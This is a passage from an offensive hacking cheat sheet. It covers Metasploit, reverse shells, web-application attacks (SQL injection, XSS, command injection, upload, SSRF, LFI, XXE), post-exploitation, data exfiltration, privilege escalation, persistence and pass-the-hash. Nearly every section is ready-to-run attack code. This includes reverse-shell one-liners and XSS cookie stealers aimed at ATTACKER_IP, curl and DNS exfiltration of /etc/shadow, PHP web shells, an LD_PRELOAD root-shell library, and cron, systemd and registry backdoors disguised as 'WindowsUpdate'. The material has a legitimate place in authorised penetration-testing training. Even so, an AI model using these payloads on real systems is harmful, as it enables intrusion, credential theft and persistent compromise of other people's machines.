    -b "DC=domain,DC=local" "(objectClass=group)"

# BloodHound data collection
# First install: sudo apt install bloodhound neo4j
bloodhound-python -d domain.local -u user -p password -ns dc_ip -c All

# Start neo4j and BloodHound
sudo neo4j start
bloodhound &
# Import collected JSON files into BloodHound GUI
# Look for "Shortest Paths to Domain Admins"
```

### 11.3 SNMP Enumeration

```bash
# SNMP (port 161 UDP) — often misconfigured with default community strings
# Community strings: "public" (read), "private" (read/write)

# Check if SNMP is running
nmap -sU -p 161 target_ip

# snmpwalk — enumerate ALL MIBs
snmpwalk -v1 -c public target_ip
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.1  # System info

# Common SNMP OIDs
# 1.3.6.1.2.1.1.1.0 = System description
# 1.3.6.1.2.1.1.3.0 = Uptime
# 1.3.6.1.2.1.1.5.0 = Hostname
# 1.3.6.1.2.1.4.34  = IP routing table
# 1.3.6.1.2.1.25.4.2.1.2 = Running processes

# onesixtyone — community string bruteforce
onesixtyone target_ip -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

# snmp-check — formatted output
snmp-check target_ip -c public
snmp-check target_ip -c public -e  # Extended
```

---

## 12. Exploitation Fundamentals

### 12.1 Metasploit Framework

```bash
# ─── Metasploit Basics ─────────────────────────────────────────

# Start Metasploit
msfconsole

# Basic commands
help                          # Show help
search eternalblue           # Search for modules
search type:exploit platform:windows  # Filtered search
use exploit/windows/smb/ms17_010_eternalblue  # Load module
info                         # Module information
show options                 # Show required options
show payloads                # Available payloads
show targets                 # Available targets

# Configure and run
set RHOSTS 172.16.100.50     # Target IP
set RPORT 445                # Target port
set LHOST 172.16.10.10       # Your listener IP
set LPORT 4444               # Your listener port
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # Choose payload
run                          # or 'exploit'

# Database integration
msfdb init                   # Initialize DB
db_nmap -sV target_ip       # Nmap scan results stored in DB
hosts                        # View discovered hosts
services                     # View discovered services
vulns                        # View discovered vulnerabilities
workspace                    # Manage workspaces

# ─── Payloads ──────────────────────────────────────────────────

# Types:
# Singles  — standalone, no stages, fully contained
# Stagers  — small, establish connection, then download stage
# Stages   — downloaded by stager (meterpreter, shell, etc.)

# Generate payload with msfvenom
# Windows reverse shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=172.16.10.10 LPORT=4444 \
    -f exe -o payload.exe

# Windows reverse shell (powershell)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=172.16.10.10 LPORT=4444 \
    -f psh -o payload.ps1

# Linux reverse shell (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=172.16.10.10 LPORT=4444 \
    -f elf -o payload.elf

# Web shell (PHP)
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=172.16.10.10 LPORT=4444 \
    -f raw -o shell.php

# ASP.NET web shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=172.16.10.10 LPORT=4444 \
    -f aspx -o shell.aspx

# Start listener (multi/handler)
msfconsole -q -x "use multi/handler; \
    set payload windows/x64/meterpreter/reverse_tcp; \
    set LHOST 172.16.10.10; \
    set LPORT 4444; \
    run"

# ─── Meterpreter Commands ──────────────────────────────────────

# After getting meterpreter session:
sysinfo              # System information
getuid               # Current user
getpid               # Process ID
ps                   # List processes
migrate 1234         # Migrate to process 1234
shell                # Drop to system shell
getsystem            # Attempt privilege escalation
getprivs             # Show privileges
hashdump             # Dump SAM database (needs admin/SYSTEM)
load kiwi            # Load mimikatz module
creds_all            # Dump all credentials (kiwi)
upload file.exe      # Upload file to target
download file.txt    # Download file from target
ls                   # List files
cd C:/               # Change directory
search -f *.txt      # Search for files
keyscan_start        # Start keylogger
keyscan_dump         # Dump keylogger results
screenshot           # Take screenshot
webcam_snap          # Webcam snapshot
run post/windows/gather/enum_system  # System enumeration
run post/multi/recon/local_exploit_suggester  # Suggest local privesc
portfwd add -l 4444 -p 3389 -r 192.168.1.10  # Port forward RDP
background           # Background session
sessions -l          # List all sessions
sessions -i 1        # Interact with session 1
```

### 12.2 Manual Exploitation & Reverse Shells

```bash
# ─── Netcat Reverse Shells ─────────────────────────────────────

# On attacker (listener):
nc -lvnp 4444

# On target (Linux):
nc -e /bin/bash ATTACKER_IP 4444      # Traditional
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1  # Bash one-liner
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f

# ─── Python Reverse Shell ─────────────────────────────────────

# Python 3
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# ─── PowerShell Reverse Shell ─────────────────────────────────

# PowerShell (on target Windows, listener on attacker)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# ─── Upgrade to Fully Interactive Shell ───────────────────────

# After getting basic shell, upgrade it:
# On target:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background
stty raw -echo; fg      # On attacker
# Press Enter twice

export TERM=xterm
stty rows 50 cols 180   # Set proper terminal size
```

---

## 13. Web Application Hacking

### 13.1 SQL Injection — Complete Guide

```bash
# ─── SQLMap (Automated SQLi) ──────────────────────────────────

# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --method POST

# With cookies (for authenticated pages)
sqlmap -u "http://target.com/profile.php?id=1" \
    --cookie="PHPSESSID=abc123"

# Specify parameter
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Dump all
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# OS shell (if stacked queries possible)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# File read
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Burp Suite request file
sqlmap -r request.txt -p id --level 5 --risk 3
```

```sql
-- ─── Manual SQL Injection Payloads ────────────────────────────

-- Test for SQLi (look for errors or behavior changes)
'
''
`
-- (comment out rest of query)
#
/*comment*/

-- Boolean-based blind
' AND 1=1 -- (true, page loads normally)
' AND 1=2 -- (false, page changes)
' AND SUBSTRING(username,1,1)='a' --

-- UNION-based (extract data)
-- First: find number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 -- (error = 3 columns exist, so ORDER BY 3 works but 4 errors)

-- Then: find which columns are visible
' UNION SELECT null,null,null --
' UNION SELECT 1,2,3 --

-- Extract database info
' UNION SELECT version(),database(),user() --

-- Extract tables (MySQL)
' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database() --

-- Extract columns
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users' --

-- Extract data
' UNION SELECT username,password,email FROM users --

-- Read files (MySQL - requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),null,null --

-- Write webshell (if directory is writable)
' UNION SELECT "<?php system($_GET['cmd']); ?>",null,null INTO OUTFILE '/var/www/html/shell.php' --

-- Bypass WAF/Filters
' /*!UNION*/ /*!SELECT*/ 1,2,3 --
'/**/UNION/**/SELECT/**/1,2,3--
' UnIoN SeLeCt 1,2,3--
```

### 13.2 Cross-Site Scripting (XSS)

```javascript
// ─── XSS Payloads ─────────────────────────────────────────────

// Basic test
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Bypass filters
<ScRiPt>alert('XSS')</ScRiPt>          // Case variation
<script>alert`XSS`</script>             // Backticks
<img src="x" onerror="alert('XSS')">   // Attribute
javascript:alert('XSS')                 // In href/src
<details/open/ontoggle=alert('XSS')>   // HTML5
<body onload=alert('XSS')>
"><script>alert('XSS')</script>         // Break out of attribute
'><script>alert('XSS')</script>

// Steal cookies (stored XSS attack)
// Attacker hosts: python3 -m http.server 8000
<script>document.location='http://ATTACKER_IP:8000/steal?c='+document.cookie</script>

// Keylogger via XSS
<script>
document.onkeypress = function(e) {
    fetch('http://ATTACKER_IP:8000/log?key=' + e.key);
}
</script>

// XSS to CSRF (force action as victim)
<script>
fetch('/api/change-password', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: 'hacked123'}),
    credentials: 'include'
});
</script>

// BeEF (Browser Exploitation Framework) hook
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

```bash
# BeEF installation and setup
sudo apt install beef-xss -y
sudo beef-xss
# Access: http://localhost:3000/ui/panel
# Default: admin / beef

# Use BeEF for:
# - Social engineering via browser
# - Browser fingerprinting
# - Network scanning from victim's browser
# - Keylogging
# - Screenshot
# - Redirect to phishing page
```

### 13.3 Command Injection

```bash
# ─── Command Injection Payloads ────────────────────────────────

# Test for command injection in a web form field
# If the app runs: ping -c 4 USER_INPUT

# Basic test
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 || id
`id`
$(id)

# Blind command injection (no output)
# Test with time delay:
127.0.0.1; sleep 5        # Linux
127.0.0.1 && ping -n 5 127.0.0.1  # Windows (delay)

# Exfiltrate data via DNS (blind)
127.0.0.1; nslookup $(whoami).ATTACKER_DOMAIN.com

# Reverse shell via command injection
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
127.0.0.1; nc ATTACKER_IP 4444 -e /bin/bash

# Windows command injection
127.0.0.1 & whoami
127.0.0.1 | whoami
127.0.0.1 && dir C:\
```

### 13.4 File Upload Vulnerabilities

```bash
# ─── File Upload Bypass Techniques ────────────────────────────

# Goal: Upload a web shell to gain RCE

# Web shells:
# PHP:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
echo '<?php echo shell_exec($_REQUEST["cmd"]); ?>' > shell.php

# ASP/ASPX:
# <%@ Page Language="C#" %><%=System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"])%>

# JSP:
# <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Bypass techniques:
# 1. Change extension
mv shell.php shell.php.jpg       # Double extension
mv shell.php shell.phtml         # Alternative PHP extension
mv shell.php shell.php5          # Alternative PHP extension
mv shell.php shell.pHp           # Case variation (Windows)
mv shell.php shell.php%00.jpg    # Null byte (old PHP)

# 2. Change MIME type (intercept with Burp Suite)
# Change: Content-Type: application/x-php
# To:     Content-Type: image/jpeg

# 3. Add valid image header to PHP shell
echo -e "\xFF\xD8\xFF\xE0" > shell.php   # JPEG magic bytes prefix
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# 4. Use .htaccess (if Apache allows override)
# Upload .htaccess with:
# AddType application/x-httpd-php .jpg
# Then upload shell.jpg — it executes as PHP!

# After upload, access shell:
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# Reverse shell via web shell
curl "http://target.com/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"
```

### 13.5 Server-Side Request Forgery (SSRF)

```bash
# SSRF — Trick server to make requests on your behalf

# Basic SSRF test
# If a web app has: ?url=http://example.com
# Try:
?url=http://127.0.0.1/admin
?url=http://localhost/admin
?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
?url=http://192.168.1.1/admin                    # Internal network

# File read via SSRF
?url=file:///etc/passwd

# Internal port scan via SSRF
?url=http://127.0.0.1:22
?url=http://127.0.0.1:3306
?url=http://127.0.0.1:6379     # Redis

# AWS metadata SSRF
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response may contain AWS access keys!

# SSRF bypass filters
?url=http://2130706433/         # 127.0.0.1 in decimal
?url=http://0x7f000001/         # 127.0.0.1 in hex
?url=http://127.1/              # Short form
?url=http://[::1]/              # IPv6 localhost
?url=http://localhost.ATTACKER.com/  # DNS rebinding

# Tools
# SSRFmap: python3 ssrfmap.py -r request.txt -p url -m readfiles
```

### 13.6 Local & Remote File Inclusion (LFI/RFI)

```bash
# ─── LFI (Local File Inclusion) ────────────────────────────────

# Vulnerable code: include($_GET['page'] . '.php');
# Test:
?page=../../../../etc/passwd
?page=../../../etc/passwd%00  # Null byte (old PHP bypass .php append)

# Path traversal characters
../
..\
..%2f
..%5c
%2e%2e%2f
..%252f          # Double encoding

# Read sensitive files
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../etc/ssh/sshd_config
?page=../../../../var/log/auth.log
?page=../../../../var/log/apache2/access.log
?page=../../../../proc/self/environ
?page=../../../../windows/system32/drivers/etc/hosts

# LFI to RCE via log file poisoning
# 1. Inject PHP into Apache access log via User-Agent:
curl "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Include the log file:
?page=../../../../var/log/apache2/access.log&cmd=id

# LFI via PHP wrappers
?page=php://filter/convert.base64-encode/resource=/etc/passwd
# Decode the output: base64 -d output.txt

?page=php://input  # POST data executed as PHP
# POST: <?php system('id'); ?>

?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# (base64 of: <?php system('id'); ?>)

# ─── RFI (Remote File Inclusion) ──────────────────────────────
# Vulnerable code: include($_GET['page']);
# Host shell on attacker:
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
python3 -m http.server 80

# Include remote file:
?page=http://ATTACKER_IP/shell.php&cmd=id
```

### 13.7 XML External Entity (XXE)

```xml
<!-- XXE — Exploiting XML parsers to read files or SSRF -->

<!-- Basic XXE test -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe "hello">]>
<root>&xxe;</root>

<!-- File read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>

<!-- Windows file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts" >
]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >
]>
<foo>&xxe;</foo>

<!-- Blind XXE (exfiltrate data via DNS/HTTP) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>

<!-- evil.dtd hosted on attacker: -->
<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->
<!-- <!ENTITY % exfil "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>"> -->
<!-- %exfil; -->
```

---

## 14. Post-Exploitation

### 14.1 Situational Awareness

```bash
# ─── Linux Post-Exploitation Enumeration ───────────────────────

# Who am I and what can I do?
id
whoami
sudo -l
cat /etc/passwd | grep -v nologin | grep -v false
groups

# System information
uname -a
cat /etc/os-release
cat /proc/version
hostname
cat /etc/hostname
cat /etc/issue

# Network information
ip a
ip route
ip neigh                    # ARP cache (who else is nearby)
netstat -tulpn
ss -tulpn
cat /etc/hosts
cat /etc/resolv.conf

# Running services
ps aux
systemctl list-units --type=service --state=running

# Interesting files
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name "*.config" -readable 2>/dev/null | head -20
find / -name "*.txt" -readable 2>/dev/null | head -20
find / -name "id_rsa" 2>/dev/null        # SSH private keys
find / -name "*.pem" 2>/dev/null         # Certificates
find / -name "*.key" 2>/dev/null         # Keys
find / -name "wp-config.php" 2>/dev/null # WordPress creds
find / -name "config.php" 2>/dev/null    # Web app creds
find / -name ".env" 2>/dev/null          # Environment files
find / -name "database.yml" 2>/dev/null  # Rails DB config

# Check bash history
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# Cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID

# Writable files/dirs
find / -writable -type f 2>/dev/null | grep -v proc | head -20
find / -writable -type d 2>/dev/null | head -20

# Recently modified files
find / -mtime -1 -type f 2>/dev/null | head -20  # Modified in last day

# Web application credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
find /var/www -name "*.php" -exec grep -l "password\|passwd\|pass" {} \; 2>/dev/null
```

```powershell
# ─── Windows Post-Exploitation Enumeration ─────────────────────

# System info
systeminfo
whoami /all
net user
net localgroup
net localgroup administrators
hostname
ipconfig /all
route print
netstat -ano
arp -a

# Interesting files
dir /s /b C:\*.txt 2>nul | findstr /i "password\|cred\|secret\|key"
dir /s /b C:\*.config 2>nul
dir /s /b C:\*.ini 2>nul
dir /s /b C:\*.xml 2>nul | findstr /i "web.config\|app.config"

# PowerShell search
Get-ChildItem -Recurse C:\ -Include *.txt,*.config,*.ini,*.xml -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|secret|credential" -ErrorAction SilentlyContinue

# Registry credentials (autologon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Saved credentials
cmdkey /list
# If saved creds exist, use runas /savecred

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="PROFILE_NAME" key=clear

# Installed software
wmic product get name,version
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Running processes (detailed)
Get-Process | Select-Object Id, ProcessName, CPU, Path | Format-Table

# Scheduled tasks
schtasks /query /fo list /v
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName

# Services
sc query state= all
Get-Service | Where-Object {$_.Status -eq "Running"}
```

### 14.2 Data Exfiltration

```bash
# ─── Data Exfiltration Techniques ─────────────────────────────

# HTTP exfiltration (simple)
# On attacker (receiver):
python3 -m http.server 8080

# On target (sender):
curl -X POST http://ATTACKER_IP:8080/ -d "$(cat /etc/passwd)"
wget --post-data="$(cat /etc/shadow)" http://ATTACKER_IP:8080/

# DNS exfiltration (bypasses firewalls)
# Split data and send via DNS queries
# Attacker must control DNS server

# Base64 encode and exfiltrate
data=$(cat /etc/passwd | base64 | tr -d '\n')
for i in $(seq 0 63 ${#data}); do
    chunk="${data:$i:63}"
    nslookup "$chunk.ATTACKER_DOMAIN.com"
done

# Python HTTP exfiltration server (receives data)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        print('RECEIVED:', data.decode())
        self.send_response(200)
        self.end_headers()
    def log_message(self, format, *args): pass
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"

# SMB exfiltration
# On attacker:
sudo impacket-smbserver share /tmp/loot -smb2support

# On target Windows:
copy C:\sensitive_file.txt \\ATTACKER_IP\share\

# SCP (if SSH available)
scp /etc/passwd user@ATTACKER_IP:/tmp/

# Netcat file transfer
# Receiver:
nc -lvnp 9999 > received_file.txt
# Sender:
nc ATTACKER_IP 9999 < file_to_send.txt
```

---

## 15. Privilege Escalation

### 15.1 Linux Privilege Escalation

```bash
# ─── Automated Enumeration ─────────────────────────────────────

# LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer and run:
chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_output.txt

# LinEnum
./LinEnum.sh -t -r report.txt

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# ─── Manual Checks ─────────────────────────────────────────────

# 1. SUDO rights
sudo -l
# Look for: (ALL) NOPASSWD: /some/binary
# GTFOBins: https://gtfobins.github.io/
# Example: sudo find / -exec /bin/bash \;

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Check each against GTFOBins
# Example SUID bash: bash -p (get root shell)
# Example SUID find: find . -exec /bin/sh -p \; -quit
# Example SUID nmap (old): nmap --interactive → !sh

# 3. Writable /etc/passwd (add root user)
# Generate password hash
python3 -c "import crypt; print(crypt.crypt('newpass', '\$6\$salt'))"
# Add new root user:
echo 'hacker:$6$salt$HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# 4. Writable cron script run by root
cat /etc/crontab
# Find writable scripts
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/cron_script.sh

# 5. Kernel exploits (use linux-exploit-suggester)
uname -r
# Check for: DirtyPipe (5.8+), DirtyCOW (older), etc.

# 6. PATH hijacking
# If a SUID binary calls a command without full path:
# strings /usr/bin/suid_binary | grep -v "/"
# Export malicious PATH:
mkdir /tmp/fake_bin
echo "bash -p" > /tmp/fake_bin/service
chmod +x /tmp/fake_bin/service
export PATH=/tmp/fake_bin:$PATH
/usr/bin/suid_binary  # Calls 'service' → gets our fake one → root

# 7. LD_PRELOAD (if sudo allows maintaining env)
# sudo -l shows: env_keep += LD_PRELOAD
cat << 'EOF' > /tmp/priv.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/priv.so /tmp/priv.c -nostartfiles
sudo LD_PRELOAD=/tmp/priv.so some_allowed_command

# 8. Capabilities
getcap -r / 2>/dev/null
# Example: python3 has cap_setuid
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 9. Docker group (escape to root)
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 10. Writable /etc/sudoers
ls -la /etc/sudoers
# If writable: echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

### 15.2 Windows Privilege Escalation

```powershell
# ─── Automated Tools ───────────────────────────────────────────

# WinPEAS
.\winPEAS.exe
.\winPEAS.bat

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended

# ─── Unquoted Service Paths ────────────────────────────────────

# Find services with unquoted paths (containing spaces)
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'

# PowerShell:
Get-WmiObject -class win32_service | Select-Object Name, PathName | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '}

# Exploit: Place malicious exe at hijackable location
# Service path: C:\Program Files\My App\service.exe
# Try placing exe at: C:\Program.exe (executed first!)
# or: C:\Program Files\My.exe

# ─── Weak Service Permissions ──────────────────────────────────

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# If we can write to service binary:
sc qc vulnerable_service   # Get service binary path
copy malicious.exe "C:\Path\To\Service\Binary.exe"
sc stop vulnerable_service && sc start vulnerable_service

# ─── DLL Hijacking ─────────────────────────────────────────────

# Find applications loading DLLs from writable paths
# Use Process Monitor (ProcMon) from Sysinternals:
# Filter: Result = NAME NOT FOUND && Path ends with .dll

# Or: Use PowerSploit's Find-ProcessDLLHijack

# Create malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o malicious.dll
# Place in writable directory where app searches

# ─── Token Impersonation (Potato Attacks) ──────────────────────

# If SeImpersonatePrivilege is available:
whoami /priv | findstr "SeImpersonate"

# PrintSpoofer (Windows 10/2016/2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (older systems)
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# ─── AlwaysInstallElevated ─────────────────────────────────────

# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 0x1, we can install MSI as SYSTEM!

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

# ─── Stored Credentials ────────────────────────────────────────

# Check for saved credentials
cmdkey /list
# If creds exist:
runas /user:DOMAIN\Administrator /savecred "cmd.exe /c whoami > C:\temp\out.txt"

# Windows Credential Manager
vaultcmd /list
vaultcmd /listproperties:"Web Credentials"

# Check for plaintext in common locations
findstr /si "password" *.txt *.xml *.config *.ini 2>nul
findstr /si "password" C:\inetpub\*.config 2>nul

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

## 16. Persistence Mechanisms

### 16.1 Linux Persistence

```bash
# ─── Linux Persistence Techniques ─────────────────────────────

# 1. SSH authorized keys (most reliable)
mkdir -p ~/.ssh
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# 2. Cron job backdoor
# Add to /etc/crontab (root) or user crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -

# 3. Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor

# 4. .bashrc / .profile modification
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> ~/.bashrc
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /root/.bashrc

# 5. SUID backdoor
cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash
# Execute: /tmp/.hidden_bash -p

# 6. LD_PRELOAD persistence
echo "/tmp/evil.so" >> /etc/ld.so.preload

# 7. /etc/rc.local (if exists)
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> /etc/rc.local
```

### 16.2 Windows Persistence

```powershell
# ─── Windows Persistence Techniques ───────────────────────────

# 1. Registry Run keys
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\user\payload.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\payload.exe" /f

# 2. Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc ONLOGON /ru SYSTEM /f
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -ep bypass -f C:\payload.ps1" /sc MINUTE /mo 5 /f

# PowerShell version:
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c C:\payload.exe'
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force

# 3. Service persistence
sc create "WindowsUpdate" binpath= "C:\payload.exe" start= auto
sc start WindowsUpdate

# 4. Startup folder
copy payload.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

# 5. WMI subscription (stealthy, survives reboots)
# Event filter — triggers on boot:
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "WindowsUpdate"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 6. DLL hijacking persistence
# Place malicious DLL in application directory

# 7. COM object hijacking (HKCU — no admin needed)
New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\{CLSID_HERE}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\{CLSID_HERE}\InprocServer32" -Name "(Default)" -Value "C:\payload.dll"
```

---

## 17. Lateral Movement

### 17.1 Pass-the-Hash

```bash
# Pass-the-Hash (PtH) — authenticate with hash instead of password
# Only works with NTLM authentication

# Dump hashes first (requires admin/SYSTEM)
# Using Mimikatz:
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Or from LSASS dump:
pypykatz lsa minidump lsass.dmp

# Pass-the-Hash with various tools

# CrackMapExec
crackmapexec smb TARGET_IP -u Administrator -H 'NTLM_HASH_HERE' --shares
crackmapexec smb TARGET_IP -u Administrator -H 'NTLM_HASH_HERE' -x "whoami"
